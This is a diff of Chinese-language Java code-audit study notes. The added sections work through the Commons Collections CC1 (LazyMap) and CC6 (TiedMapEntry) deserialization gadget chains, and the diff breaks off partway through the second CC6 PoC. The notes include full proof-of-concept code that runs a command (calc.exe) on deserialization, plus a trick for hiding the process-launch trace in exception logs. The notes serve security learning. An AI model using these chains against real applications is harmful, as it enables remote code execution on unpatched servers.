@@ -6,6 +6,8 @@
 >
 > **《Java安全漫谈》**:https://github.com/phith0n/JavaThings
 >
+> https://www.freebuf.com/column/3143 代码审计的学习笔记
+>
 > java代码审计的checklist：https://xz.aliyun.com/t/3358
 >
 > 《Java代码审计（入门篇）》
@@ -1150,13 +1152,15 @@
 
 - **按照思路，执行类找到了，接下来就要去找哪个类中有方法调用了**
 
+- **重复找多次Gadget知道找到方法是在`readObject()`调用的。**
+
 - **`InvokerTransformer.transform()`这个危险方法，通过 find usages 来看下：**
 
 - ![image-20221028191434813](./java代码审计.assets/image-20221028191434813.png)
 
 可以看到库中有17个方法，那哪些方法合适呢？
 
-- 要求是要**能序列化**，参数类型广泛，优先 readObject()。**我们的transformers对象要能传入到这个类当中（类的构造函数或者当前方法有这个参数）。**且方法名不应是 transform()，因为如果方法名是 transform()，那不就嵌套了吗，那我们找到的这个函数就没法调用了。
+- 要求是要**能序列化**，参数类型广泛，**优先 readObject()(这样就直接找到了source类了)**。**我们的transformers对象要能传入到这个类当中（类的构造函数或者当前方法有这个参数）。**且方法名不应是 transform()，因为如果方法名是 transform()，那不就嵌套了吗，那我们找到的这个函数就没法调用了。
 - 最后找到的6个类![image-20221028193318680](./java代码审计.assets/image-20221028193318680.png)
 
 - 对应方法为
@@ -1486,6 +1490,217 @@
   虽然会报类转换错误，但是是先反序列化成对象，然后 (User)转换的。所以没有关系。
   ```
 
+### cc1—LazyMap分析：
+
+- `Commons-Collections <= 3.2.1， jdk<8u71`
+
+- 之前我们找Gadget的时候，还有几个调用链没有分析，`LazyMap.get()`
+
+- LazyMap和HashMap有什么区别？
+
+    - Lazymap意思就是这个Map中的键/值对一开始并不存在，当被调用到时才创建
+    - 我们这样来理解，我们需要一个Map,但是由于创建成员的方法很“重”（比如数据库访问）
+    - 我们只有在调用get()时才知道如何创建，或者Map中出现的可能性很多
+    - 我们无法在get()之前添加所有可能出现的键/值对
+    - 我们觉得没有必要去初始化一个Map而又希望它在必要时自动处理数据。
+
+- 关于 Lazymap的使用再说两点，LazyMap的构造函数也是protected无法new生成对象，一般需要使用 Lazymap. decorate(Map, Factory)的方式来创建。传入map和transformer即可构造lazymap。
+
+    ```java
+        /**
+         * Factory method to create a lazily instantiated map.
+         * 
+         * @param map  the map to decorate, must not be null
+         * @param factory  the factory to use, must not be null
+         * @throws IllegalArgumentException if map or factory is null
+         */
+        public static Map decorate(Map map, Factory factory) {
+            return new LazyMap(map, factory);
+        }
+        /**
+         * Factory method to create a lazily instantiated map.
+         * 
+         * @param map  the map to decorate, must not be null
+         * @param factory  the factory to use, must not be null
+         * @throws IllegalArgumentException if map or factory is null
+         */
+        public static Map decorate(Map map, Transformer factory) {
+            return new LazyMap(map, factory);
+        }
+    
+    ```
+
+- ```java
+        //-----------------------------------------------------------------------
+        public Object get(Object key) {
+            // create value for key if key is not currently in the map
+            if (map.containsKey(key) == false) {
+                Object value = factory.transform(key);
+                map.put(key, value);
+                return value;
+            }
+            return map.get(key);
+        }
+    ```
+
+- **当调用LazyMap.get()方法的时候，如果传入的key不存在，那么就自动生成一个(key，value)存在到map中。key会被传入transform执行。**
+
+- find usage找一找，发现4千多条，cc1用的AnnotationInvocationHandler类，不过这次是`invoke`方法。所以要继续找Gadget链了。
+
+    - ```java
+        public Object invoke(Object proxy, Method method, Object[] args) {
+            //获取要调用的方法名和传入该方法的参数类型
+            String member = method.getName();
+            Class<?>[] paramTypes = method.getParameterTypes();
+              // Handle Object and Annotation methods
+          //对方法名和参数类型做一些限制，方法参数数量必须为0，方法名不能为equals
+          if (member.equals("equals") && paramTypes.length == 1 &&
+              paramTypes[0] == Object.class)
+              return equalsImpl(args[0]);
+          if (paramTypes.length != 0)
+              throw new AssertionError("Too many parameters for an annotation method");
+        
+            //方法名不能为toString、hashCode、annotationType
+          switch(member) {
+          case "toString":
+              return toStringImpl();
+          case "hashCode":
+              return hashCodeImpl();
+          case "annotationType":
+              return type;
+          }
+        
+          // Handle annotation member accessors
+          //lazymap.get()就会调用了。
+          Object result = memberValues.get(member);
+        
+          if (result == null)
+              throw new IncompleteAnnotationException(type, member);
+        
+          if (result instanceof ExceptionProxy)
+              throw ((ExceptionProxy) result).generateException();
+        
+          if (result.getClass().isArray() && Array.getLength(result) != 0)
+              result = cloneArray(result);
+        
+          return result;
+        }
+        ```
+
+- 条件：对方法名和参数类型做一些限制，方法参数数量必须为0，方法名不能为equals，方法名不能为toString、hashCode、annotationType。
+
+- **那什么时候会调用AnnotationInvocationHandler的invoke方法呢，find usage并没有找到有用的。**
+
+- **这条链子用到了动态代理**。当调用到被代理对象的任何方法时（**这个方法满足上述条件**），都会先调用InvocationHandler接口中的invoke方法，而AnnotationInvocationHandler正好实现了该接口。
+
+    - ```java
+        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件
+                Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+                ctor.setAccessible(true);
+                InvocationHandler handler = (InvocationHandler) ctor.newInstance(Target.class, outerMap);//得到我们构造好的 AnnotationInvocationHandler类实例
+        
+                //创建一个Map代理类,当map对象任意函数调用的时候，都会执行handler的invoke函数
+                Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
+        ```
+
+- map类的函数需要满足，方法参数数量必须为0，方法名不能为equals，方法名不能为toString、hashCode、annotationType。这样的函数有很多，`entrySet()`函数就是其中一个。
+
+- 再找找哪里调用了这个函数。有很多，而且发现`AnnotationInvocationHandler`的`readObject`方法调用了，这就直接找到source了。
+
+    - ```java
+            private void readObject(java.io.ObjectInputStream s)
+                throws java.io.IOException, ClassNotFoundException {
+                s.defaultReadObject();
+        
+                // Check to make sure that types have not evolved incompatibly
+        
+                AnnotationType annotationType = null;
+                try {
+                    annotationType = AnnotationType.getInstance(type);
+                } catch(IllegalArgumentException e) {
+                    // Class is no longer an annotation type; time to punch out
+                    throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
+                }
+        
+                Map<String, Class<?>> memberTypes = annotationType.memberTypes();
+        
+                // If there are annotation members without values, that
+                // situation is handled by the invoke method.
+           		//找到了。
+                for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
+        ```
+
+- 所以就再生成一个AnnotationInvocationHandler对象，为了反序列化用，这个时候传入的是代理类。
+
+    - ```java
+        InvocationHandler instance = (InvocationHandler) ctor.newInstance(Target.class, proxymap);
+        ```
+
+- poc
+
+    - ```java
+        package cc;
+        
+        import org.apache.commons.collections.Transformer;
+        import org.apache.commons.collections.functors.ChainedTransformer;
+        import org.apache.commons.collections.functors.ConstantTransformer;
+        import org.apache.commons.collections.functors.InvokerTransformer;
+        import org.apache.commons.collections.map.LazyMap;
+        
+        import java.io.*;
+        import java.lang.annotation.Target;
+        import java.lang.reflect.Constructor;
+        import java.lang.reflect.InvocationHandler;
+        import java.lang.reflect.Proxy;
+        import java.util.HashMap;
+        import java.util.Map;
+        
+        public class CC1_LazyMap {
+            public static void main(String[] args) throws Exception{
+                Transformer[] transformers = new Transformer[] {
+                        new ConstantTransformer(Runtime.class),
+                        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})};
+                Transformer transformedChain = new ChainedTransformer(transformers);  //实例化一个反射链
+        
+                Map innerMap = new HashMap();   //实例化一个Map对象
+                Map outerMap = LazyMap.decorate(innerMap, transformedChain); //构造一个LazyMap对象。
+        
+        
+                Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件
+                Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+                ctor.setAccessible(true);
+                InvocationHandler handler = (InvocationHandler) ctor.newInstance(Target.class, outerMap);//得到我们构造好的 AnnotationInvocationHandler类实例
+        
+                //创建一个Map代理类,当map对象任意函数调用的时候，都会执行handler的invoke函数
+                Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
+        
+                //再生成一个AnnotationInvocationHandler对象，为了反序列化用，这个时候传入的是代理类。
+                InvocationHandler instance = (InvocationHandler) ctor.newInstance(Target.class, proxymap);
+        
+                FileOutputStream f = new FileOutputStream("./test.txt");
+                ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
+                out.writeObject(instance);  //将我们构造的 AnnotationInvocationHandler类进行序列化
+                out.flush();
+                out.close();
+                //开始反序列化test.txt文件
+                Unser();
+            }
+        
+            public static void Unser() throws IOException,ClassNotFoundException{
+                FileInputStream in = new FileInputStream("./test.txt");   //实例化一个文件输入流
+                ObjectInputStream ins = new ObjectInputStream(in);      //实例化一个对象输入流
+                CC1_TransformedMap.User u= (CC1_TransformedMap.User) ins.readObject();   //反序列化
+                System.out.println("反序列化成功！");
+                ins.close();
+            }
+            class User {
+            }
+        }
+        
+        ```
+
 ### 反序列化工具ysoserial.jar
 
 - ysoserial是一款用于生成利用不安全的Java对象反序列化的有效负载的概念验证工具。项目地址：https://github.com/frohoff/ysoserial。可以自己编译，也可以直接下载jar文件。
@@ -1520,213 +1735,437 @@
 
   ![image-20211203113352471](java代码审计.assets/image-20211203113352471.png)
 
-  - 使用commonsColletions5生成的payload在本地jdk8环境下复现成功
-    ![image-20211203113442453](java代码审计.assets/image-20211203113442453.png)
 - cc链：
 
   - apache commons-collections组件反序列化漏洞的反射链也称为CC链。
-  - ![img](java代码审计.assets/75&e=1643644799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zDfP4bhYmbr0Ah4zPmYiD6AmmO7Cs=.jpeg)
+  - ![image-20221029185912250](./java代码审计.assets/image-20221029185912250.png)
 
 ### ysoserial.jar源码分析
-
-#### CommonsCollections1分析：
 
 - idea反编译jar文件后，打开payload目录，各种利用链都在这。
 - ![image-20211228102601756](java代码审计.assets/image-20211228102601756.png)
 
-  ```java
-  String[] execArgs = new String[]{command};
-  
-  Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
-  
-  Transformer[] transformers = new Transformer[]{
-  	new ConstantTransformer(Runtime.class), 
-  	new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},new Object[]{"getRuntime", new Class[0]}), 
-  	new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), 
-      new InvokerTransformer("exec", new Class[]{String.class}, execArgs), 
-      new ConstantTransformer(1)};
-  ```
-- 构造transformers链，第一个Transformer，只有一个ConstantTransformer，在之前的简化版代码中已经学过了，ConstantTransformer的参数是1，那transform方法返回的也是1。
-- 第二个Transformer是通过反射获取Runtime对象，通过反射，获取invoke方法，再通过反射，执行exec方法，这个不难。
+#### cc1—LazyMap分析：
 
-  ```java
-  Map innerMap = new HashMap();
-  Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-  ```
-- 构造一个hashmap对象，同时创建了LazyMap对象，参数是之前的map和ConstantTransformer对象。进入 LazyMap.decorate()函数。
+- ysoserial并没有用到transformedmap，transformedMap最早出现在Code White的这篇Slide中：[https://www.slideshare.net/codewhitesec/exploiting...](https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478) 。
 
-  ```java
-  public static Map decorate(Map map, Transformer factory) {
-  	return new LazyMap(map, factory);
-  }
-  
-  protected LazyMap(Map map, Transformer factory) {
-      super(map);
-      if (factory == null) {
-      	throw new IllegalArgumentException("Factory must not be null");
-      } else {
-      	this.factory = factory;
-  	}
-  }
-  ```
-- LazyMap通过HashMap初始化了自己，然后将Transformer对象存到factory变量。
-- LazyMap和HashMap有什么区别？
+- 代码和我们上面写的差不多，就是transfomer链最后通过反射传入的。之前的transfomer链就一个transfomers，真正的链子在transformers数组里面。
 
-  - Lazymap意思就是这个Map中的键/值对一开始并不存在，当被调用到时才创建
-  - 我们这样来理解，我们需要一个Map,但是由于创建成员的方法很“重”（比如数据库访问）
-  - 我们只有在调用get()时才知道如何创建，或者Map中出现的可能性很多
-  - 我们无法在get()之前添加所有可能出现的键/值对
-  - 我们觉得没有必要去初始化一个Map而又希望它在必要时自动处理数据。
-  - 关于 Lazymap的使用再说两点，一般需要使用 Lazymap. decorate(Map, Factory)的方式来创建，实现 Factory中的 create方法.
-- 查看get方法
+    - ```java
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+        ```
 
-  ```java
-      public Object get(Object key) {
-          if (!this.map.containsKey(key)) {
-              Object value = this.factory.transform(key);
-              this.map.put(key, value);
-              return value;
-          } else {
-              return this.map.get(key);
-          }
-      }
-  }
-  ```
-- 当get一个不存在的key时，会将key通过Transformer产生value，然后存储到map中，返回value
-  到这里明白了，使用当LazyMap的get一个不存在的键时，就会调用Transformer，导致命令执行。
-- 再继续看调用了Gadgets.createMemoitizedProxy函数
-
-  ```java
-  Map mapProxy = (Map)Gadgets.createMemoitizedProxy(lazyMap, Map.class, new Class[0]);
-  ```
-
-  ```java
-  public static <T> T createMemoitizedProxy(Map<String, Object> map, Class<T> iface, Class<?>... ifaces) throws Exception {
-  
-     return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
-  
-  }
-  
-  public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
-  
-    return (InvocationHandler)Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, map);
-  
-  }
-  ```
-- 通过反射，创建了AnnotationInvocationHandler对象，构造参数为Override.class, map。
-- AnnotationInvocationHandler类可以用于动态代理。动态代理详解看java语言的笔记。
-- 看下AnnotationInvocationHandler的构造函数
-
-  ```java
-  AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
-      Class<?>[] superInterfaces = type.getInterfaces();
-      if (!type.isAnnotation() ||
-          superInterfaces.length != 1 ||
-          superInterfaces[0] != java.lang.annotation.Annotation.class)
-          throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
-      this.type = type;  //type是我们传入的Override.class
-      this.memberValues = memberValues;  //传入的map存到了memberValues
-  }
-  ```
-- 如图，可以看见将Override.class和map存到了对象的变量里，所以可以将AnnotationInvocationHandler当做一个封装了LazyMap的类。
-- 回到最初的createMemoitizedProxy方法内，AnnotationInvocationHandler、Map.class和new Class[0]一起传给了createProxy
-
-  ```java
-  public static <T> T createProxy(InvocationHandler ih, Class<T> iface, Class<?>... ifaces) {
-      Class<?>[] allIfaces = (Class[])((Class[])Array.newInstance(Class.class, ifaces.length + 1));
-      allIfaces[0] = iface;
-      if (ifaces.length > 0) {
-          System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
-      }
-  
-    return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
-  }
-  ```
-- 这里的Proxy.newProxyInstance是，java代理模式的一种：动态代理
-
-  - 可以理解为将AnnotationInvocationHandler设置为了LazyMap的代理类，代理的方法为Map接口中的所有方法。
-  - 即通过这个代理类访问接口Map中的所有方法都会交给代理类AnnotationInvocationHandler中的invoke方法处理。
-- 查看AnnotationInvocationHandler的invoke方法。
-
-  ```java
-  public Object invoke(Object proxy, Method method, Object[] args) {
-      //获取要调用的方法名和传入该方法的参数类型
-      String member = method.getName();
-      Class<?>[] paramTypes = method.getParameterTypes();
-
-
-      // Handle Object and Annotation methods
-      //对方法名和参数类型做一些限制，方法参数数量必须为0，方法名不能为equals
-      if (member.equals("equals") && paramTypes.length == 1 &&
-          paramTypes[0] == Object.class)
-          return equalsImpl(args[0]);
-      if (paramTypes.length != 0)
-          throw new AssertionError("Too many parameters for an annotation method");
-    //方法名不能为toString、hashCode、annotationType
-      switch(member) {
-      case "toString":
-          return toStringImpl();
-      case "hashCode":
-          return hashCodeImpl();
-      case "annotationType":
-          return type;
-      }
-    
-      // Handle annotation member accessors
-      //这里的memberValues是之前构造好的LazyMap对象,也就是调用了LazyMap.get(member),然后就会进入LazyMap.get(member)函数里面，就开始执行transformer链了，具体代码看上面LazyMap.get的实现。
-      Object result = memberValues.get(member);
-    
-      if (result == null)
-          throw new IncompleteAnnotationException(type, member);
-    
-      if (result instanceof ExceptionProxy)
-          throw ((ExceptionProxy) result).generateException();
-    
-      if (result.getClass().isArray() && Array.getLength(result) != 0)
-          result = cloneArray(result);
-    
-      return result;
-        }
-
-- 所以，只要满足方法名和参数个数限制，就会调用LazyMap的get，就会触发命令执行
-- 所以，Map接口内除了toString、hashCode、annotationType的并且参数数量为0的所有方法，都可以触发命令执行（神奇！）
-- 下一行代码 `createMemoizedInvocationHandler`，之前分析过了。使用mapProxy，创建了AnnotationInvocationHandler对象，相当于对mapProxy的封装。为什么要这么做？
-
-  - 因为在上一步构造出的mapProxy对象，只要被调用除toString、hashCode、annotationType的所有参数数量为0的方法，就会造成命令执行。
-  - 但是我们需要在反序列化时触发上面的条件，即在readObject中调用mapProxy的参数为空的方法。
-- 那看一下AnnotationInvocationHandler的readObject方法
-
-  - ![img](java代码审计.assets/1639315809_61b5f961447a1c57338d7.png)
-  - 先看红框，从序列化数据中读取到了memberValues（之前构造的LazyMap对象），然后调用了它的entrySet方法，该方法参数为空，满足了触发条件，执行了transformer链。
-  - 再看蓝框，从序列化数据中读取type的Class对象t，然后使用t创建了AnnotationType类型对象，如果创建失败，就会抛异常。
-  - 这个type是什么？如图，是Override.class。
-
-    - ![image-20211228143025001](java代码审计.assets/image-20211228143025001.png)
-  - 在AnnotationInvocationHandler构造函数里可以通过Class<? extends Annotation> type接收，那就说明Override.class一定是继承自Annotation的，所以反序列化时，蓝框内条件百分百满足，所以，至此，，反序列化链构造完毕。
-- 但是我们之前的transfomer链就一个transfomers，真正的链子在transformers数组里面。
-
-  ```java
-  Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
 - 所以最后通过反射改掉了transfomer链的数组为真正的transformers数组。为什么这样做？
 
+  - 在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所 以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了 命令。
   - 先使用transformerChain构造利用链，之后在构造好反序列化对象后，将transformerChain中的Transformer链替换为真正的链，是**为了避免在构造利用链时触发命令执行**。
   - 利用链都构造好了，再修改transformerChain，有用吗？
     因为transformerChain只是引用，用来序列化的对象内储存的也是引用，，引用相当于指针，二者访问的是同一块内存的数据，而我们修改的正是这块内存的数据，所以当然有用。
+
 - 总结：
 
-  - ![image-20211228144007323](java代码审计.assets/image-20211228144007323.png)
   - ysoserial在构造Transformers时，为什么要用那么多反射?
 
     - 因为Runtime类没有继承Serializable接口，所以不能被序列化，在序列化时会出错，使用反射可以解决这个问题。
   - 为什么使用LazyMap，不使用HashMap？InvocationHandler可以换成其它类吗？
 
-    - LazyMap配合LazyMap.decorate，可以在get时触发，InvocationHandler在反序列化时会执行到LazyMap的get。
-    - HashMap配合TransformedMap，可以在put时触发，可以配合其他的类。所以有了其他的cc链。
-    - InvocationHandler是用来在反序列化时触发LazyMap.get的，如果其他类在反序列化时会调用LazyMap.get。所以有了其他的cc链。
+    - 不知道，反正这两个都可以。
   - 为什么Transformers数组最后要加一个ConstantTransformer(1)？
 
-    - 因为Transformers链执行后的内容要添加进map的，而前面的Transformer执行的是Runtime.exec，返回结果是ProcessImpl对象，ProcessImpl类没有继承serializable类，不能被序列化，所以后面加个ConstantTransformer(1)，被添加进map的就是1。
+    - 如果这里没有 ConstantTransformer，命令进程对象将会被 LazyMap#get 返回，导致我们在异常信息里能看到这个 特征：
+
+        - ```cmd
+            Exception in thread "main" java.lang.ClassCastException: 
+            java.lang.ProcessImpl cannot be cast to java.util.Set
+            ```
+
+    - 如果我们增加一个 ConstantTransformer(1) 在TransformChain的末尾，异常信息将会变成 `java.lang.Integer cannot be cast to java.util.Set` ，隐蔽了启动进程的日志特征：
+
+### 其他cc链
+
+#### cc6—高jdk版本可用
+
+- jdk1.8.0_341复现成功
+
+- 我们详细分析了CommonsCollections1这个利⽤链和其中的LazyMap原理。但是我们说到，在 Java 8u71以后，这个利⽤链不能再利⽤了，主要原因 是 `sun.reflect.annotation.AnnotationInvocationHandler#readObject` 的逻辑变化了（那我们就找其他Gadget就好了，也是利用LazyMap）。
+
+- 在ysoserial中，CommonsCollections6可以说是commons-collections这个库中相对⽐较通⽤的利用链，**为了解决高版本Java的利⽤问题，我们先来看看这个利⽤链。**
+
+- 不会按照ysoserial中的代码进⾏讲解，原因是ysoserial的代码过于复杂了，而且其实⽤到了⼀些没必要的类。
+
+- 简化版利⽤链
+
+    - ```java
+        /*
+         Gadget chain:
+         java.io.ObjectInputStream.readObject()
+         java.util.HashMap.readObject()
+         java.util.HashMap.hash()
+         
+        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+         
+        org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+         org.apache.commons.collections.map.LazyMap.get()
+         
+        org.apache.commons.collections.functors.ChainedTransformer.transform()
+         
+        org.apache.commons.collections.functors.InvokerTransformer.transform()
+         java.lang.reflect.Method.invoke()
+         java.lang.Runtime.exec()
+        */
+        ```
+
+- TiedMapEntry存在
+
+    - ```java
+        
+        /**
+        * Constructs a new entry with the given Map and key.
+        *
+        * @param map  the map
+        * @param key  the key
+        */
+        public TiedMapEntry(Map map, Object key) {
+            super();
+            this.map = map;
+            this.key = key;
+        }
+        
+        /**
+        * Gets the value of this entry direct from the map.
+        * 
+        * @return the value
+        */
+        public Object getValue() {
+            return map.get(key);
+        }
+        ```
+
+- 再find usage找找`getValue()`的调用，这个类本身就找到hashCode函数会调用。欲触发LazyMap利⽤链，要找到就是哪⾥调⽤了 `TiedMapEntry#hashCode` 。
+
+    - ```java
+            public int hashCode() {
+                Object value = getValue();
+                return (getKey() == null ? 0 : getKey().hashCode()) ^
+                       (value == null ? 0 : value.hashCode()); 
+            }
+        ```
+
+- ysoserial中，是利⽤ java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key) 最后到 TiedMapEntry#hashCode() 。 实际上，在 java.util.HashMap#readObject 中就可以找到 HashMap#hash() 的调⽤，去掉了 最前⾯的两次调用。
+
+- 继续找，HashMap#hash，
+
+    - TiedMapEntry由key传入。
+
+    - ```java
+        static final int hash(Object key) {
+            int h;
+            return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
+        }
+        ```
+
+- 继续找，HashMap#readObject()
+
+    - ```java
+        private void readObject(java.io.ObjectInputStream s)
+            throws IOException, ClassNotFoundException {
+            // Read in the threshold (ignored), loadfactor, and any hidden stuff
+            s.defaultReadObject();
+            reinitialize();
+            if (loadFactor <= 0 || Float.isNaN(loadFactor))
+                throw new InvalidObjectException("Illegal load factor: " +
+                                                 loadFactor);
+            s.readInt();                // Read and ignore number of buckets
+            int mappings = s.readInt(); // Read number of mappings (size)
+            if (mappings < 0)
+                throw new InvalidObjectException("Illegal mappings count: " +
+                                                 mappings);
+            else if (mappings > 0) { // (if zero, use defaults)
+                // Size the table using given load factor only if within
+                // range of 0.25...4.0
+                float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
+                float fc = (float)mappings / lf + 1.0f;
+                int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
+                           DEFAULT_INITIAL_CAPACITY :
+                           (fc >= MAXIMUM_CAPACITY) ?
+                           MAXIMUM_CAPACITY :
+                           tableSizeFor((int)fc));
+                float ft = (float)cap * lf;
+                threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
+                             (int)ft : Integer.MAX_VALUE);
+                @SuppressWarnings({"rawtypes","unchecked"})
+                Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
+                table = tab;
+        
+                // Read the keys and values, and put the mappings in the HashMap
+                for (int i = 0; i < mappings; i++) {
+                    @SuppressWarnings("unchecked")
+                    K key = (K) s.readObject();
+                    @SuppressWarnings("unchecked")
+                    V value = (V) s.readObject();
+                    putVal(hash(key), key, value, false, false);
+                }
+            }
+        }
+        ```
+
+    - 在HashMap的readObject⽅法中，调⽤到了 hash(key)，key为HashMap的一个键，所以我们直接`.put(tiedMapEntry, "123")`就行。
+
+- 写poc
+
+    - ```java
+        package cc;
+        
+        import org.apache.commons.collections.Transformer;
+        import org.apache.commons.collections.functors.ChainedTransformer;
+        import org.apache.commons.collections.functors.ConstantTransformer;
+        import org.apache.commons.collections.functors.InvokerTransformer;
+        import org.apache.commons.collections.keyvalue.TiedMapEntry;
+        import org.apache.commons.collections.map.LazyMap;
+        
+        import java.io.*;
+        import java.lang.reflect.Field;
+        import java.util.HashMap;
+        import java.util.Map;
+        
+        public class CC6 {
+            public static void main(String[] args) throws Exception{
+        
+                Transformer[] transformers = new Transformer[] {
+                        new ConstantTransformer(Runtime.class),
+                        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
+                };
+                //创建一个fake利用链，最后的时候把这个利用链换成上面的
+                Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
+                Transformer transformedChain = new ChainedTransformer(fakeTransformers);  //实例化一个反射链
+        
+                //构造一个LazyMap对象。
+                Map innerMap = new HashMap();
+                Map outerMap = LazyMap.decorate(innerMap, transformedChain);
+        
+                //拿到了⼀个恶意的LazyMap对象 outerMap ，将其作为 TiedMapEntry 的map属性
+                TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
+        
+                //构建一个新的HashMap对象，最后，我就可以将这个 expMap 作为对象来序列化了
+                Map expMap = new HashMap();
+                expMap.put(tme, "valuevalue");
+        
+                //outerMap.remove("keykey");
+        
+                // 将真正的transformers数组设置进来
+                Field fd = ChainedTransformer.class.getDeclaredField("iTransformers");
+                fd.setAccessible(true);
+                fd.set(transformedChain, transformers);
+        
+                FileOutputStream f = new FileOutputStream("./test.txt");
+                ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
+                out.writeObject(expMap);  //将我们构造的 AnnotationInvocationHandler类进行序列化
+                out.flush();
+                out.close();
+                //开始反序列化test.txt文件
+                Unser();
+            }
+        
+            public static void Unser() throws IOException,ClassNotFoundException{
+                FileInputStream in = new FileInputStream("./test.txt");   //实例化一个文件输入流
+                ObjectInputStream ins = new ObjectInputStream(in);      //实例化一个对象输入流
+                User u= (User) ins.readObject();   //反序列化
+                System.out.println("反序列化成功！");
+                ins.close();
+            }
+            class User {
+            }
+        }
+        
+        ```
+
+- 发现并没用弹窗，下断点到LazyMap的get函数看看。
+
+    - ![image-20221029211706683](./java代码审计.assets/image-20221029211706683.png)
+
+    - 发现map有个key叫`keykey`，我们也没放东西给LazyMap啊，怎么多出一个东西？
+
+    - 我们只给TiedMapEntry放入了一个key叫`keykey`，但是TiedMapEntry构造函数并没有修改我们的LazyMap啊
+
+        - ```java
+            //拿到了⼀个恶意的LazyMap对象 outerMap ，将其作为 TiedMapEntry 的map属性
+            TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
+            ```
+
+        - ```java
+            public TiedMapEntry(Map map, Object key) {
+                super();
+                this.map = map;
+                this.key = key;
+            }
+            ```
+
+    - 其实，这个关键点就出在 `expMap.put(tme, "valuevalue");` 这个语句⾥⾯
+
+        - ```java
+            public V put(K key, V value) {
+                    return putVal(hash(key), key, value, false, true);
+                }
+            ```
+
+        - HashMap的put⽅法中，也有调⽤到 `TiedMapEntry.hashCode(key)` ：
+
+            - ```java
+                static final int hash(Object key) {
+                    int h;
+                    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
+                }
+                ```
+
+        - 这⾥就导致 LazyMap 这个利⽤链在这⾥被调⽤了⼀遍，然后LazyMap就去get("keykey")，并把这个key保存下来了。
+
+    - 所以我们把这个key删掉即可
+
+- poc
+
+    - ```java
+        package cc;
+        
+        import org.apache.commons.collections.Transformer;
+        import org.apache.commons.collections.functors.ChainedTransformer;
+        import org.apache.commons.collections.functors.ConstantTransformer;
+        import org.apache.commons.collections.functors.InvokerTransformer;
+        import org.apache.commons.collections.keyvalue.TiedMapEntry;
+        import org.apache.commons.collections.map.LazyMap;
+        
+        import java.io.*;
+        import java.lang.reflect.Field;
+        import java.util.HashMap;
+        import java.util.Map;
+        
+        public class CC6 {
+            public static void main(String[] args) throws Exception{
+        
+                Transformer[] transformers = new Transformer[] {
+                        new ConstantTransformer(Runtime.class),
+                        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
+                };
+                //创建一个fake利用链，最后的时候把这个利用链换成上面的
+                Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
+                Transformer transformedChain = new ChainedTransformer(fakeTransformers);  //实例化一个反射链
+        
+                //构造一个LazyMap对象。
+                Map innerMap = new HashMap();
+                Map outerMap = LazyMap.decorate(innerMap, transformedChain);
+        
+                //拿到了⼀个恶意的LazyMap对象 outerMap ，将其作为 TiedMapEntry 的map属性
+                TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
+        
+                //构建一个新的HashMap对象，最后，我就可以将这个 expMap 作为对象来序列化了
+                Map expMap = new HashMap();
+                expMap.put(tme, "valuevalue");
+        
+                outerMap.remove("keykey");
+        
+                // 将真正的transformers数组设置进来
